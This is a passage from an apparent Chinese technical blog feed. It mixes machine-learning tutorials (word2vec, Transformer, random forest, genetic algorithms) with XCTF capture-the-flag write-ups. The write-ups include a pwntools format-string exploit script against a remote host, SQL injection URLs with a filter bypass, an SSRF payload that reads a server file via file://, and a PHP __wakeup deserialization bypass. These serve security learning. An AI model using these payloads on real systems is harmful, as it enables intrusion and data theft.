<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_context_vector</span>(<span class="params">context, word_to_ix</span>):</span></span><br><span class="line">    idxs = [word_to_ix[w] <span class="keyword">for</span> w <span class="keyword">in</span> context]</span><br><span class="line">    <span class="keyword">return</span> torch.tensor(idxs, dtype=torch.long)</span><br><span class="line">make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">device = torch.device(<span class="string">&#x27;cuda:0&#x27;</span>)</span><br><span class="line">losses = []</span><br><span class="line">loss_function = nn.NLLLoss()</span><br><span class="line">model = CBOW(<span class="built_in">len</span>(vocab), embedding_dim=<span class="number">10</span>, context_size=CONTEXT_SIZE*<span class="number">2</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    total_loss = torch.Tensor([<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> context, target <span class="keyword">in</span> data:</span><br><span class="line">        context_ids = make_context_vector(context, word_to_ix)</span><br><span class="line">        context_ids = context_ids.to(device)</span><br><span class="line">        model.zero_grad()</span><br><span class="line">        log_probs = model(context_ids)</span><br><span class="line">        label = torch.tensor([word_to_ix[target]], dtype=torch.long)</span><br><span class="line">        label = label.to(device)</span><br><span class="line">        loss = loss_function(log_probs, label)</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">        total_loss += loss.item()</span><br><span class="line">    losses.append(total_loss)</span><br><span class="line"><span class="built_in">print</span>(losses)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.embeddings(make_context_vector(data[<span class="number">0</span>][<span class="number">0</span>], word_to_ix))</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p>[1] <a href="https://zhuanlan.zhihu.com/p/114538417">深入浅出Word2Vec原理解析 - 知乎 (zhihu.com)</a></p>
<p>[2] <a href="https://samaelchen.github.io/word2vec_pytorch/">word2vec的PyTorch实现 | 碎碎念 (samaelchen.github.io)</a></p>
]]></content>
      <categories>
        <category>deep_learning</category>
      </categories>
      <tags>
        <tag>model</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer</title>
    <url>/2022/07/02/transformer.html</url>
    <content><![CDATA[<p>源自论文<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p>
<p>最近开始做计算机视觉CV，图像分割，将transformer引入到CV领域，有VIT , PVT 等模型。</p>
<p>本文希望全面了解tranformer，包括其中的一些细节，当然包括代码。看了下李宏毅的课程，SeqtoSeq模型输入序列，输出序列，但是不知道输出的长度。</p>
<h2 id="总体框架">总体框架</h2>
<p>Transformer中抛弃了传统的CNN和RNN，整个网络结构完全是由Attention机制组成。更准确地讲，Transformer由且仅由<strong>self-Attenion</strong> 和Feed Forward Neural Network组成。一个基于Transformer的可训练的神经网络可以通过堆叠Transformer的形式进行搭建，作者的实验是通过搭建编码器和解码器各6层，总共12层的<strong>Encoder-Decoder</strong> ，并在机器翻译中取得了BLEU值得新高。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945347-1855395805.png" /></p>
<h2 id="编码器和解码器">编码器和解码器</h2>
<p><a href="https://blog.csdn.net/weixin_40642114/article/details/104755855">(34条消息) 对于编码器与解码器的理解_就叫俩美的博客-CSDN博客</a></p>
<p>这本菜谱有很多章节，每个章节都是文字描写如何烹饪不同的菜。现在我们讲所有文字输入到SegNet当中，注意此时SegNet接收到的只是文字信息，它并不知道这本菜谱的构成。Encoder所做的就是它能<strong>理解这本菜谱的结构，对其中的内容进行抽象，形成一些高阶的信息</strong> （比如描述做了什么菜），并将这些信息对应到一个简化的空间里。Decoder<strong>对这些简化的高阶信息进行理解与编译，并且对相同语义相近的文字进行分类并对应到具体的菜式上面</strong> （比如：凉菜，面食，鱼，肉等）。这样以来，仅从文字上，我们就可以大概知道这是描述哪个菜式了，可能是凉菜，也可能是面食。换句话说，你不仅能获得菜式信息，并且可以知道这些菜式对应的是哪一个章节，哪些字句，是不是很棒？</p>
<h1 id="网络结构组成">网络结构组成</h1>
<h2 id="输入">输入</h2>
<p>输入由词嵌入向量和位置嵌入向量相加构成。词嵌入向量可以通过Word2Vec，Glove等预训练模型得到，或者在transformer中训练得到。位置嵌入的计算方法</p>
<p><span class="math display">\[
\begin{array}{c}
P E_{(p o s, 2 i)}=\sin \left(p o s / 10000^{2 i / d}\right) \\
P E_{(p o s, 2 i+1)}=\cos \left(p o s / 10000^{2 i / d}\right)
\end{array}
\]</span></p>
<p>其中，pos 表示单词在句子中的位置，d 表示 PE的维度 (与词 Embedding 一样)，2i 表示偶数的维度，2i+1 表示奇数维度 (即 2i≤d, 2i+1≤d)。使用这种公式计算 PE 有以下的好处：</p>
<ul>
<li><p>使 PE 能够适应比训练集里面所有句子更长的句子，假设训练集里面最长的句子是有 20 个单词，突然来了一个长度为 21 的句子，则使用公式计算的方法可以计算出第 21 位的 Embedding。</p></li>
<li><p>可以让模型容易地计算出相对位置，对于固定长度的间距 k，<strong>PE(pos+k)</strong> 可以用 <strong>PE(pos)</strong> 计算得到。因为 Sin(A+B) = Sin(A)Cos(B) + Cos(A)Sin(B), Cos(A+B) = Cos(A)Cos(B) - Sin(A)Sin(B)。</p></li>
</ul>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945418-1028929102.png" /></p>
<p>和RNN不同的是，<strong>transformer采用的是句子的全局信息</strong> ，每次训练输入一个句子，而RNN则每次输入一个词，一个输入二维矩阵，一个输入向量。所以仅使用词Embedding无法利用句子的顺序信息，<strong>使用位置嵌入来获得顺序信息</strong> ，而顺序信息在NLP中非常有用。</p>
<h2 id="自注意力机制self-attention">自注意力机制self-attention</h2>
<p>结构如下图，MASK是在Decoder中才有的，Encoder中没有。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945427-1330668174.png" /></p>
<p>在计算的时候需要用到矩阵<strong>Q(查询),K(键值),V(值)</strong> 。在实际中，Self-Attention 接收的是输入(单词的表示向量x组成的矩阵X) 或者上一个 Encoder block 的输出。而<strong>Q,K,V</strong> 正是通过 Self-Attention 的输入进行线性变换得到的。</p>
<p>Self-Attention 的输入用矩阵X进行表示，则可以使用线性变阵矩阵<strong>WQ,WK,WV</strong> 计算得到<strong>Q,K,V</strong> 。计算如下图所示，<strong>注意 X, Q, K, V 的每一行都表示一个单词。</strong></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945642-1455768983.png" /></p>
<p><span class="math display">\[
\text { Attention }(Q, K, V)=\operatorname{softmax}\left(\frac{Q K^{T}}{\sqrt{d_{k}}}\right) V
\]</span></p>
<p>$d_{k} $ 是 Q, K 矩阵的列数, 即向量维度,公式中计算矩阵<strong>Q</strong> 和<strong>K</strong> 每一行向量的内积，为了防止内积过大，因此除以 $d_{k} $的平方根。下图中输入的字符个数为4.</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945308-1431330177.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225946127-64581045.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945288-1978934372.png" /></p>
<h2 id="multi-head-attention">Multi-Head Attention</h2>
<p>Multi-Head Attention含有多个self-attention,从同一个X得到多个Z，然后进行concat操作，最后Linear操作。最终输出的Z和输入的X维度相同。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945338-1834150213.png" /></p>
<h2 id="encoder">Encoder</h2>
<p>Transformer 的 Encoder block 结构，可以看到是由 Multi-Head Attention, <strong>Add &amp; Norm, Feed Forward, Add &amp; Norm</strong> 组成的。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945326-1713923268.png" /></p>
<p><span class="math display">\[
\begin{array}{l}
\text { LayerNorm }(X+\text { MultiHeadAttention }(X)) \\
\quad \text { LayerNorm }(X+\text { FeedForward }(X))
\end{array} 
\]</span></p>
<p>Feed Forward由两个全连接层构成，前一个含有relu激活函数，后一个没有。<strong>X</strong> 是输入，Feed Forward 最终得到的输出矩阵的维度与<strong>X</strong> 一致。</p>
<p><span class="math display">\[
\max \left(0, X W_{1}+b_{1}\right) W_{2}+b_{2}
\]</span></p>
<h2 id="decoder">Decoder</h2>
<ul>
<li><p>包含两个 Multi-Head Attention 层。</p></li>
<li><p>第一个 Multi-Head Attention 层采用了 Masked 操作。</p></li>
<li><p>第二个 Multi-Head Attention 层的<strong>K, V</strong> 矩阵使用 Encoder 的<strong>编码信息矩阵C</strong> 进行计算，而<strong>Q</strong> 使用上一个 Decoder block 的输出计算。</p></li>
<li><p>最后有一个 Softmax 层计算下一个翻译单词的概率。</p></li>
</ul>
<p>从下图可以看到有两个Multi-Head ，一个被MASKED了，一个没有。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945334-1798179260.png" /></p>
<p>Decoder block 的第一个 Multi-Head Attention 采用了 Masked 操作，因为在翻译的过程中是顺序翻译的，即<strong>翻译完第 i 个单词，才可以翻译第 i+1 个单词</strong> 。通过 Masked 操作可以<strong>防止第 i 个单词知道 i+1 个单词之后的信息</strong> 。下面以 "我有一只猫" 翻译成 "I have a cat" 为例，了解一下 Masked 操作。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945309-9003550.png" /></p>
<p><strong>Mask 操作是在 Self-Attention 的 Softmax 之前使用的</strong></p>
<p>先使用输入矩阵得到一个Mask矩阵，然后使用X计算Q,K,V三个矩阵。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945285-2074873202.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945400-1172436575.png" /></p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945427-1960481663.png" /></p>
<h2 id="softmax计算概率">softmax计算概率</h2>
<p>Decoder block 最后的部分是利用 Softmax 预测下一个单词，在之前的网络层我们可以得到一个最终的输出 Z，因为 Mask 的存在，使得单词 0 的输出 Z0 只包含单词 0 的信息。</p>
<p>softmax会根据每一行预测对应的概率。</p>
<p><img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702225945336-1169349922.png" /></p>
<h1 id="参考">参考</h1>
<p>[1] <a href="https://zhuanlan.zhihu.com/p/48508221">详解Transformer （Attention Is All You Need） - 知乎 (zhihu.com)</a></p>
<p>[2] <a href="https://zhuanlan.zhihu.com/p/338817680">Transformer模型详解（图解最完整版） - 知乎 (zhihu.com)</a></p>
<p><strong>Mask 操作是在 Self-Attention 的 Softmax 之前使用的</strong></p>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>deep_learngin</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-CGfsd</title>
    <url>/2021/11/12/xctf-CGfsd.html</url>
    <content><![CDATA[<p>PWN中的格式化字符漏洞，从实践出发。</p>
<span id="more"></span>
<h2 id="printf格式化字符串">printf格式化字符串</h2>
<h3 id="基础知识">基础知识</h3>
<p>printf常见用法,前面是format，后面是匹配的参数。printf本身可以输入无限参数，即printf不知道参数个数，有格式化字符串%s,%d,%c等就到栈中去取参数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br></pre></td></tr></table></figure>
<p>有一个特殊的格式化字符串%n,将前面的字符数量输入到参数中，赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;aaaa%n&quot;,&amp;d);// d=4</span><br></pre></td></tr></table></figure>
<p>介绍一个格式化字符串的用法<strong>%5$d</strong>,表示参数从左到右第5个参数，好多博客这里没有讲，但是不同类型会不会有影响就不知道了，比如参数的类型不同，size不同，printf是不知道栈的那个位置具体是什么类型的。</p>
<p>直接输出s，没有格式化字符串。一般情况下是正常的输出s。但是一旦s中存在格式化字符串就可能存在漏洞。这个时候<strong>s就相当于format</strong>，但是没有传入任何参数。printf就会<strong>从栈顶开始依次匹配</strong>相应的类型大小数据输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(s);</span><br></pre></td></tr></table></figure>
<h3 id="实例">实例</h3>
<p>写一个小的C文件看看。</p>
<p><img src="/images/xctf-CGfsd/2348945-20210924214658533-1665723789.png" /></p>
<p>输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x,可以发现从栈顶开始依次输出。可以看到地址61FE3C的位置存储着s字符串。匹配的第7个单元是s的实际存储位置。</p>
<p><strong>主要是中间调用了printf函数导致很难具体分析栈空间，所以需要使用这种方法找到偏移位置。</strong></p>
<figure>
<img src="/images/xctf-CGfsd/2348945-20210924214649609-1405132903.png" alt="image-20210924214644435" /><figcaption aria-hidden="true">image-20210924214644435</figcaption>
</figure>
<figure>
<img src="/images/xctf-CGfsd/2348945-20210924220054329-1040800902.png" alt="image-20210924220048916" /><figcaption aria-hidden="true">image-20210924220048916</figcaption>
</figure>
<h2 id="xtf_cgfsd">XTF_CGFSD</h2>
<figure>
<img src="/images/xctf-CGfsd/2348945-20210924220519202-68676763.png" alt="image-20210924220513883" /><figcaption aria-hidden="true">image-20210924220513883</figcaption>
</figure>
<p><strong>目标：</strong>将pwnme的地址放到字符串s中，并且使用%(offset)$n将输出的字符串长度8放到那个地址中。将那个地址作为printf传入的第offset个参数。</p>
<figure>
<img src="/images/xctf-CGfsd/2348945-20210924214603821-1020535736.png" alt="image-20210924214557978" /><figcaption aria-hidden="true">image-20210924214557978</figcaption>
</figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">55024</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;please tell me your name:&quot;</span>)</span><br><span class="line">r.send(<span class="string">&quot;sdsds&quot;</span>)</span><br><span class="line">p=<span class="number">0x804A068</span></span><br><span class="line">payload=p32(p)+<span class="string">&quot;aaaa&quot;</span>+<span class="string">&quot;%10$n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;leave your message please:&quot;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<figure>
<img src="/images/xctf-CGfsd/2348945-20210924214806885-2131536334.png" alt="image-20210924214801629" /><figcaption aria-hidden="true">image-20210924214801629</figcaption>
</figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-fakebook</title>
    <url>/2021/11/12/xctf-fakebook.html</url>
    <content><![CDATA[<p>攻防世界-web-fakebook结题过程</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<h3 id="使用dirmap扫描">使用dirmap扫描</h3>
<p>查看网页，发现只有login和join两个功能，扫描结果：<img src="/images/xctf-fakebook/2348945-20210803091934485-1631918819.png" /></p>
<p>login用于登录，join.php用于注册用户，view.php</p>
<p>因为刚开始使用dirmap，字典很差很多没扫出来，尤其是flag.php</p>
<h3 id="寻找注入点爆破">寻找注入点爆破</h3>
<ol type="1">
<li><p>注册登录后进入<code>http://111.200.241.244:54207/view.php?no=1</code>，可能存在注入，可以尝试一下，但是目前只有一个用户。<img src="/images/xctf-fakebook/2348945-20210803092319661-797664669.png" alt="image-20210803092317796" style="zoom: 50%;" /></p></li>
<li><p><code>http://111.200.241.244:54207/view.php?no=2-1</code>，页面不变，发现是数字型注入。</p></li>
<li><p>使用<code>http://111.200.241.244:54207/view.php?no=1%20order by 4 %23</code>,返回，列数为4.</p></li>
<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20select%201,2,3,4%20%23</code></p>
<p>联合查询被检测到了。<img src="/images/xctf-fakebook/2348945-20210803092855345-1138880396.png" alt="image-20210803092853586" /></p></li>
<li><p>试试布尔盲注<code>http://111.200.241.244:54207/view.php?no=1%20and%200%20%23</code>成功了。下面又试试这个成功了。写代码是不能的，还是直接sqlmap来的快。尝试了一下发现响应太慢？？？？不得行啊。 手动发现数据库名长度为8，难道真的要依次试试嘛。第一个字符为f，难道就是flag？</p>
<p>发现正确的，响应时间很长，错误的响应时间很短。应该就是fakebook就是这个嘛 。</p>
<figure>
<img src="./images/xctf-fakebook/2348945-20210803093525594-61070285.png" alt="image-20210803093523771" /><figcaption aria-hidden="true">image-20210803093523771</figcaption>
</figure></li>
<li><p>又试试报错，显示了报错信息。但是又不能使用updatexml，其他的没试。<img src="/images/xctf-fakebook/2348945-20210803093258691-1812634557.png" alt="image-20210803093256905" /></p>
<figure>
<img src="./images/xctf-fakebook/2348945-20210803093102514-1853772178.png" alt="image-20210803093100610" /><figcaption aria-hidden="true">image-20210803093100610</figcaption>
</figure></li>
<li><p>百度了一下，发现union select过滤的绕过可以使用union all select 绕过。或者union\**<img src="/images/xctf-fakebook/2348945-20210803095205266-1077013596.png" alt="image-20210803095203278" /></p></li>
<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%22fakebook%22%20%23</code></p>
<p>发现users表</p></li>
<li><p><code>http://111.200.241.244:54207/view.php?no=-1%20union%20all%20select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%22users%22%20%23</code><img src="/images/xctf-fakebook/2348945-20210803095411100-648756374.png" alt="image-20210803095409210" /></p></li>
<li><p>data列中是O:8:"UserInfo":3:{s:4:"name";s:5:"jason";s:3:"age";i:0;s:4:"blog";s:9:"jason.com";} 明显是用户类序列化的结果。不对啊，我要的是flag啊，这是啥啊。还是看writeup把，好家伙user.php.bak没扫出来，字典垃圾了，赶紧加上。</p></li>
<li><p>查看user.php.bak，大概就是view.php中的内容，核心在有一个网络请求blog中。</p></li>
<li><p>根据扫描结果可以知道根目录下有一个flag.php但是浏览器打开啥也没有。</p></li>
<li><p>使用SSRF服务器端请求伪造，view.php让它去请求flag.php就可以了，猜测flag.php的实际路径为<code>/var/www/html/flag.php</code>构造file协议<code>file:///var/www/html/flag.php</code></p></li>
<li><p>payload:</p>
<p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view.php?no=0/**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3</span><br><span class="line">&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.p</span><br><span class="line">hp&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p></li>
<li><p>flag:<img src="/images/xctf-fakebook/2348945-20210803115421633-1711242055.png" alt="image-20210803115419560" /></p>
<p>iframe中的base64编码数据解码之后也可以看到flag</p></li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>RandomForest</title>
    <url>/2021/10/17/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97.html</url>
    <content><![CDATA[<h2 id="决策树">决策树</h2>
<p>先来复习一下决策树，根据预测结果不同，决策树分为回归决策树和分类决策树。很多的决策树集成，就成为了森林。常见的算法有随机森林和GDBT。</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<p>决策树是一种树形结构每个内部分支都是基于一个属性，每个叶节点代表一种类型。其实决策树就是在将一个多维（特征个数）空间进行划分，切分，产生不同类别。</p>
<h3 id="分类决策树">分类决策树</h3>
<p>分类决策树本身就是通过计算信息增益，选择特征，根据特征的值的个数形成分支，剪支（还没学）。</p>
<p><span class="math inline">\(x_i\)</span>代表某个特征的取值，<span class="math inline">\(P(x_i)\)</span>代表该类型的占比，<strong>信息熵</strong>衡量的是该特征的<strong>混乱程度</strong>，公式：</p>
<p>​ <span class="math display">\[H(X)=-\sum_{i=1}^{n}p(x_i)log p(x_i)\]</span></p>
<p>决策树要做的就是通过对比使用每个特征进行分支产生的信息增益--信息熵的减少程度来选择特征。</p>
<p>参考：<a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
<h3 id="回归决策树">回归决策树</h3>
<h3 id="classification-and-regression-tree-cart">（classification and regression tree, CART）</h3>
<p>这里复习一下<strong>回归和拟合的区别</strong>：</p>
<p>回归分析：是一种统计学上分析数据的方法，目的在于了解两个或多个变量间<strong>是否相关</strong>、<strong>相关方向与强度</strong>，并建立数学模型以便观察特定变量来预测研究者感兴趣的变量。</p>
<p>拟合：是一种把现有数据透过数学方法来代入<strong>一条数式</strong>的表示方式。</p>
<p>回归决策树将一个内部节点中的所有数据的该特征的平均值作为预测值。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925133815973-632336899.png" alt="img" style="zoom: 50%;" /></p>
<figure>
<img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210925132930783-421450240.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="随机森林算法random-forestrf">随机森林算法（random forest,RF）</h2>
<h3 id="简介">简介</h3>
<p>随机森林是一种基于集成学习的思想和决策树模型而产生的分类器。<strong>集成学习（Ensemble Learning）</strong>通过使用多个弱分类器，来组成一个强分类器，提高准确率。使用多个不同决策树<strong>独立</strong>的决策结果，少数服从多数的方法来分类。</p>
<p>少数优秀的树的预测结果将会超脱于芸芸“噪音”，做出一个好的预测。将若干个弱分类器的分类结果进行投票选择，从而组成一个强分类器，这就是随机森林<strong>bagging</strong>的思想。bagging的代价是不用单棵决策树来做预测，<strong>具体哪个变量起到重要作用变得未知</strong>，所以bagging<strong>改进了预测准确率但损失了解释性</strong>。</p>
<h3 id="决策树生成规则">决策树生成规则</h3>
<ol type="1">
<li>如果训练集大小为N，对于每棵树而言，随机且有放回地从训练集中的抽取N个训练样本（这种采样方式称为bootstrap sample方法），作为该树的训练集；（<strong>bootstrap sample取样方法</strong>，随机有放回）</li>
<li>如果每个样本的特征维度为M，指定一个常数m&lt;&lt;M，随机地从M个特征中选取m个特征子集，每次树进行分裂时，从这m个特征中选择最优的；</li>
<li>每棵树都尽最大程度的生长，并且没有剪枝过程。</li>
</ol>
<p><strong>解释</strong>：随机抽样可以让<strong>每个决策树使用的数据集不同</strong>，给出不同的预测结果。有放回不至于让每个决策树得到数据集中的一部分，这样的结果是<strong>片面的</strong>。</p>
<p>两个随机：随机取样和随机取m个特征。</p>
<h3 id="分类效果">分类效果</h3>
<ul>
<li>森林中任意两棵树的相关性：相关性越大，错误率越大；</li>
<li>森林中每棵树的分类能力：每棵树的分类能力越强，整个森林的错误率越低。</li>
</ul>
<p>　　减小特征选择个数m，树的相关性和分类能力也会相应的降低；增大m，两者也会随之增大。所以关键问题是如何选择最优的m（或者是范围），这也是随机森林唯一的一个参数。</p>
<h3 id="袋外错误率out-of-bag-error">袋外错误率（out of bag error）</h3>
<p>袋外错误率主要用于选取最佳的m值。</p>
<p>对每个样本，使用没有选择这个样本的决策树进行预测，使用少数服从多数的方法，得到预测结果。</p>
<p>最终得到每个样本是否被正确预测，计算袋外错误率。</p>
<h3 id="代码使用">代码使用</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line">rfc = RandomForestClassifier(n_estimators=<span class="number">100</span>)<span class="comment">#树的数量</span></span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/373879791">决策树之分类树与回归树 - 知乎 (zhihu.com)</a></p>
<p>[<a href="https://zhuanlan.zhihu.com/p/406627649">机器学习基础复习] 随机森林(Random Forest) - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Daycym/article/details/84455299">(12条消息) 【机器学习】分类决策树与回归决策树案例_Daycym的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/cpc784221489/article/details/92085702">(12条消息) 随机森林算法详解_阿斯达克-CSDN博客_随机森林详解</a></p>
<p>https://www.zhihu.com/question/24904495/answer/371618173</p>
]]></content>
      <categories>
        <category>machine_learning</category>
      </categories>
      <tags>
        <tag>model</tag>
      </tags>
  </entry>
  <entry>
    <title>xctf-unserialize3</title>
    <url>/2021/11/12/xctf-unserialize3.html</url>
    <content><![CDATA[<p>xctf web php序列化和反序列化</p>
<span id="more"></span>
<meta name="referrer" content="no-referrer"/>
<h3 id="序列化和反序列化">序列化和反序列化</h3>
<p>序列化通俗来讲就是将对象转化为可以传输的字符串；</p>
<p>反序列化就是把那串可以传输的字符串再变回对象。</p>
<h4 id="例子">例子：</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> chybeta;    <span class="comment">//这里就是创建啦一个新的对象</span></span><br><span class="line"><span class="variable">$class1_ser</span> = serialize(<span class="variable">$class1</span>);   <span class="comment">//将这个对象进行字符串封装，就是对其进行序列化</span></span><br><span class="line">print_r(<span class="variable">$class1_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure>
<img src="../images/xctf-unserialize3/20190814175124372.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>来解释一下：O:7:"chybeta":1:{s:4:"test";s:3:"123";}</p>
<p>这里的O呢就是object对象的意思，数字7代表着对象的函数名有7个占位，然后就是对象名了</p>
<p>这个数字1表示对象里有一个变量，大括号里的s代表的是string类型还有一个i是int型</p>
<p>再使用反序列化函数，结果print为chybeta Object([test] =&gt; 123)</p>
<p>原文链接：https://blog.csdn.net/LTtiandd/article/details/99591998</p>
<h3 id="魔法函数">魔法函数</h3>
<figure>
<img src="/images/xctf-unserialize3/2348945-20210802102700561-1202520313.png" alt="在这里插入图片描述" /><figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<h3 id="题目分析">题目分析</h3>
<p>访问看到<img src="/images/xctf-unserialize3/2348945-20210802102055943-1130257407.png" alt="image-20210802102055048" /></p>
<p>明显需要看出需要绕过__wakeup函数才行，？code表名使用GET方法传参数__</p>
<p>code可能是XCTF类序列化再反序列化的结果</p>
<p>**_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。**</p>
<p>所以将对象数改成1以上的值就可以，也就是XCTF后的2，表示的是类中的变量的个数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://blog.csdn.net/qq_36438489/article/details/106141535">(3条消息) 攻防世界-unserialize3_魔术函数，以及wakeup（）函数的绕过_Kvein Fisher的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>遗传算法（单目标）</title>
    <url>/2022/07/02/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95.html</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>遗传算法模拟了自然界物竞天择、适者生存的的进化过程，保留好的物种。</p>
<p>遗传算法是从代表问题可能潜在的解集的一个<strong>种群</strong>（population）开始的，而一个种群则由经过<strong>基因</strong>（gene）编码的一定数目的<strong>个体</strong>(individual)组成。每个个体实际上是<strong>染色体</strong>(chromosome)带有特征的实体。</p>
<p>是一种搜索最优解的优化模型，个人感觉很多这种搜索算法都是为了解决局部最优解的问题。遗传算法并<strong>不保证你能获得问题的最优解</strong>，但是使用遗传算法的最大优点在于你不<strong>必去了解和操心如何去“找”最优解</strong>,而只要简单的“否定”一些表现不好的个体就行了。</p>
<h2 id="理解">理解</h2>
<p>遗传算法中<strong>每一条染色体/个体，对应着遗传算法的一个解决方案</strong>，一般我们用<strong>适应性函数（fitness function）</strong>来衡量这个解决方案的优劣。所以从一个基因组到其解的适应度形成一个映射。可以把遗传算法的过程看作是一个在多元函数里面求最优解的过程。</p>
<p>生动理解：</p>
<p>在遗传算法中，有很多袋鼠，它们降落到喜玛拉雅山脉的任意地方。这些袋鼠并不知道它们的任务是寻找珠穆朗玛峰。但每过几年，就在一些<strong>海拔高度较低的地方射杀一些袋鼠</strong>，并希望存活下来的袋鼠是多产的，在它们所处的地方生儿育女。就这样经过许多年，这些袋鼠们竟然都不自觉地聚拢到了一个个的山峰上，可是在所有的袋鼠中，只有聚拢到珠穆朗玛峰的袋鼠被带回了美丽的澳洲（最优解）。</p>
<h2 id="概念">概念</h2>
<h3 id="列举">列举</h3>
<p>基因型(genotype)：性状染色体的内部表现；</p>
<p>表现型(phenotype)：染色体决定的性状的外部表现，或者说，根据基因型形成的个体的外部表现；</p>
<p>进化(evolution)：种群逐渐适应生存环境，品质不断得到改良。生物的进化是以种群的形式进行的。</p>
